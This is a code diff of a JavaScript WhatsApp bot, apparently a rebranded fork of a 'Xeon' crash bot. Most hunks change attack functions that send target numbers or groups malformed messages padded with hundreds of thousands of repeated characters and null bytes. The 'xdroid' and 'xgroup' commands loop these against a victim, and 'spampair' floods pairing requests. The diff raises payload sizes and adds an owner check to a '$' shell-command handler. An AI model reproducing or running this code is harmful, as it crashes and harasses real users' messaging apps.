@@ -192,7 +192,7 @@ delete client.autoshalat[m.chat]
     }
     }
     
-    const replygcxeon = (teks) => {
+    const reply = (teks) => {
 	viper.sendMessage(m.chat, {
                         text: teks,
                         contextInfo: {
@@ -406,9 +406,9 @@ const wanted = {
                         message: {
                             newsletterAdminInviteMessage: {
                                 newsletterJid: '33333333333333333@newsletter',
-                                newsletterName: "🦄드림 가이 Xeon" + "ꦾ".repeat(120000),
+                                newsletterName: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚" + "ꦾ".repeat(155000),
                                 jpegThumbnail: "",
-                                caption: "ꦽ".repeat(120000),
+                                caption: "ꦽ".repeat(155000),
                                 inviteExpiration: Date.now() + 1814400000,
                             },
                         },
@@ -424,8 +424,8 @@ const wanted = {
         }
 		
 		    async function XeonXRobust(target, o, Ptcp = true) {
-	const jids = `_*~@13135550002~*_\n`.repeat(10200);
-	const ui = 'ꦽ'.repeat(70000);
+	const jids = `*~@13135550002~*\n`.repeat(15200);
+	const ui = 'ꦽ'.repeat(10000);
    await viper.relayMessage(target, {
      ephemeralMessage: {
       message: {
@@ -438,7 +438,7 @@ const wanted = {
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
-          fileName: "🦄드림 가이 Xeon",
+          fileName: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚",
           fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
           directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1726867151",
@@ -448,12 +448,12 @@ const wanted = {
          hasMediaAttachment: true,
         },
 
-									body: { text: '🦄드림 가이 Xeon' + ui + jids },
+									body: { text: '𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚' + ui + jids },
 									contextInfo: {
 										mentionedJid: ['13135550002@s.whatsapp.net'],
 										mentions: ['13135550002@s.whatsapp.net'],
 										},
-								    footer: { text: '' },
+								    footer: { text: ui },
 									nativeFlowMessage: {},
         contextInfo: {
          mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
@@ -472,7 +472,7 @@ const wanted = {
            fileLength: "9999999999999",
            pageCount: 1316134911,
            mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
-           fileName: "🦄드림 가이 Xeon",
+           fileName: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚",
            fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
            directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1724474503",
@@ -498,7 +498,7 @@ const wanted = {
 	}
 	
 	
-	async function XeonXRobustV2(target) {
+async function XeonXRobustV2(target) {
 const stanza = [
 {
 attrs: { biz_bot: '1' },
@@ -514,7 +514,7 @@ let messagePayload = {
 viewOnceMessage: {
 message: {
 listResponseMessage: {
-title: "Bro can your please help me" + "ꦽ".repeat(45000),
+title: "*Hello I Am* 𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚" + "ꦽ".repeat(45000),
 listType: 2,
 singleSelectReply: {
     selectedRowId: "🩸"
@@ -540,13 +540,13 @@ quotedMessage: {
                         contactVcard: true,
                         caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                     },
-                    contentText: "🦄드림 가이 Xeon \"👋\"",
-                    footerText: "🦄드림 가이 Xeon",
+                    contentText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚 \"👋\"",
+                    footerText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚",
                     buttons: [
                         {
-                            buttonId: "\u0000".repeat(150000),
+                            buttonId: "\u0000".repeat(850000),
                             buttonText: {
-                                displayText: "🦄드림 가이 Xeon"
+                                displayText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚"
                             },
                             type: 1
                         }
@@ -591,12 +591,12 @@ trustBannerType: "kontol",
 trustBannerAction: 99999,
 isSampled: true,
 externalAdReply: {
-title: "! 🦄드림 가이 Xeon - \"𝗋34\" 🩸",
+title: "! 𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚 - \"𝗋34\" 🩸",
 mediaType: 2,
 renderLargerThumbnail: false,
 showAdAttribution: false,
 containsAutoReply: false,
-body: "🦄드림 가이 Xeon",
+body: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚",
 thumbnail: o,
 sourceUrl: "go fuck yourself",
 sourceId: "dvx - problem",
@@ -617,7 +617,7 @@ canRequestFeedback: true
 forwardedNewsletterMessageInfo: {
 newsletterJid: "120363222395675670@newsletter",
 serverMessageId: 1,
-newsletterName: `🦄드림 가이 Xeon${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
+newsletterName: `𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
 contentType: 3,
 accessibilityText: "kontol"
 },
@@ -627,7 +627,7 @@ utmSource: "utm",
 utmCampaign: "utm2"
 }
 },
-description: "🦄드림 가이 Xeon"
+description: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚"
 },
 messageContextInfo: {
 messageSecret: crypto.randomBytes(32),
@@ -645,8 +645,8 @@ ticket_id: crypto.randomBytes(16),
 await viper.relayMessage(target, messagePayload, {
 additionalNodes: stanza,
 participant: { jid : target }
-});
-console.log(chalk.blueBright("XeonBugV2"))
+})
+console.log(chalk.green('Sended Viper FC'))
 }
 
 		const Porke = {
@@ -1849,8 +1849,8 @@ await viper.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => rep
 break
 
 case 'spampair': {
-	if (!isPremium) return replygcxeon(mess.premium)
-			if (!q) return replygcxeon(`_Use : ${prefix+command} number\n_Example : ${prefix+command} 916909137211`)
+	if (!isPremium) return reply(mess.premium)
+			if (!q) return reply(`_Use : ${prefix+command} number\n_Example : ${prefix+command} 916909137211`)
 			let [peenis, pepekk = "200"] = q.split("|")
 			
 			let target = peenis.replace(/[^0-9]/g, '').trim()
@@ -1865,7 +1865,7 @@ case 'spampair': {
 			let {
 				version
 			} = await fetchLatestBaileysVersion()
-	 replygcxeon(`Success!`)
+	 reply(`Success!`)
 			let sucked = await makeWaSocket({
 				auth: state,
 				version,
@@ -1883,7 +1883,7 @@ case 'spampair': {
 		break
 		
 case "listgc":{
-	if (!isPremium) return replygcxeon(mess.premium)
+	if (!isPremium) return reply(mess.premium)
 let getGroups = await viper.groupFetchAllParticipating()
 let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
 let anu = groups.map((v) => v.id)
@@ -2236,8 +2236,8 @@ reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 break
 
 case 'xdroid':
-if (!isPremium) return replygcxeon(mess.premium)
-	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
+if (!isPremium) return reply(mess.only.premium)
+	if (!q) return reply(`Example:\n ${prefix + command} 91xxx`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 victim = text.split("|")[0]
 Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
@@ -2252,15 +2252,14 @@ var contactInfo = await viper.onWhatsApp(Xreturn);
     return;
   }
   if (contactInfo.length == 0) {
-    return replygcxeon("The number is not registered on WhatsApp");
+    return reply("The number is not registered on WhatsApp");
   }
 
-replygcxeon(`In process`)
+reply(`In process`)
 	await sleep(1000)
 for (let i = 0; i < 10; i++) {
-	await XeonXRobust(Xreturn, viper, (cct = true), (ptcp = true));
     await XeonXRobustV2(Xreturn)
-    await XeonXRobust(target, o, Ptcp = true)
+    await XeonXRobust(Xreturn, viper, (cct = true), (ptcp = true));
     await XeonXRobustV2(target)
     }
 	sendMessageWithMentions(
@@ -2271,8 +2270,8 @@ for (let i = 0; i < 10; i++) {
 break;
 
 	case 'xgroup':
-	if (!isPremium) return replygcxeon(mess.premium)
-	if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us\n\nTo get group id, please type .listgc\n\nTo get group id from a group link, type .group-id link `)
+	if (!isPremium) return reply(mess.premium)
+	if (!q) return reply(`Example:\n ${prefix + command} 120363047626537xxx@g.us\n\nTo get group id, please type .listgc\n\nTo get group id from a group link, type .group-id link `)
 victim = text.split("|")[0]
 async function xgc4(victim) {
             try {
@@ -2281,9 +2280,9 @@ async function xgc4(victim) {
                         message: {
                             newsletterAdminInviteMessage: {
                                 newsletterJid: '33333333333333333@newsletter',
-                                newsletterName: "🦄드림 가이 Xeon" + "ꦾ".repeat(140000),
+                                newsletterName: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚" + "ꦾ".repeat(155000),
                                 jpegThumbnail: "",
-                                caption: "ꦽ".repeat(140000),
+                                caption: "ꦽ".repeat(155000),
                                 inviteExpiration: Date.now() + 1814400000,
                             },
                         },
@@ -2305,7 +2304,7 @@ message: {
                             deviceListMetadata: {},
                         }, 
     "extendedTextMessage": {
-        "text": "🦄드림 가이 Xeon" ,
+        "text": "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚" ,
         "previewType": true,
         "contextInfo": {
             "stanzaId": "B69F7CFEE38571AB03CD9DEEFAD69605",
@@ -2318,7 +2317,7 @@ message: {
 		await viper.relayMessage(victim, {
 'groupInviteMessage': {
 "inviteExpiration": Math.floor(Date.now() / 1000) + 31536000,
-"groupName":` 🦄드림 가이 Xeon`.repeat(1500),
+"groupName":` 𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚`.repeat(1500),
 'groupJid': '120363047626537933@g.us',
 'inviteExpiration': '999',
 'caption': '> ㅤㅤㅤㅤㅤㅤㅤ',
@@ -2341,14 +2340,13 @@ contactVcard: true
 'forwardedNewsletterMessageInfo': {
 'newsletterJid': '120363222395675670@newsletter',
 'serverMessageId': 1,
-'newsletterName': "🦄드림 가이 Xeon".repeat(1500)
+'newsletterName': "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚".repeat(1500)
 }
 }
 }
 }, {});
 		}
 		async function xgc3(victim){
-			const mangeak = fs.readFileSync("./database/virtex/mangeak.js")
 await viper.relayMessage(
       victim,
       {
@@ -2361,7 +2359,7 @@ await viper.relayMessage(
   scheduledCallCreationMessage: {
 "scheduledTimestampMs": Date.now(),
          callType: 1,
-         title: `🦄드림 가이 Xeon` + mangeak
+         title: `𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚` + `ꦾ`.repeat(300000)
     }
     
   },                   
@@ -2382,7 +2380,7 @@ await sleep(10000); // Delay for 5 seconds
 break
 
 case 'xweb':
-if (!isPremium) return replygcxeon(mess.premium)
+if (!isPremium) return reply(mess.premium)
 try {
 for (let i = 0; i < 10; i++) {
 messa = await prepareWAMessageMedia({
@@ -2398,7 +2396,7 @@ catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
 "productImage": messa.imageMessage,
 "productId": "449756950375071",
 "itemCount": 99999999999,
-"title": `PC KILLER X 🦄드림 가이 Xeon`,
+"title": `X 𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚`,
 "description": ``,
 "currencyCodeIso4217": "IDR",
 "footerText": ``,
@@ -4018,6 +4016,7 @@ break
 default:
 }
 if (budy.startsWith('$')) {
+if (!isOwner) return reply(mess.only.owner)
 exec(budy.slice(2), (err, stdout) => {
 if(err) return reply(err)
 if (stdout) return reply(stdout)
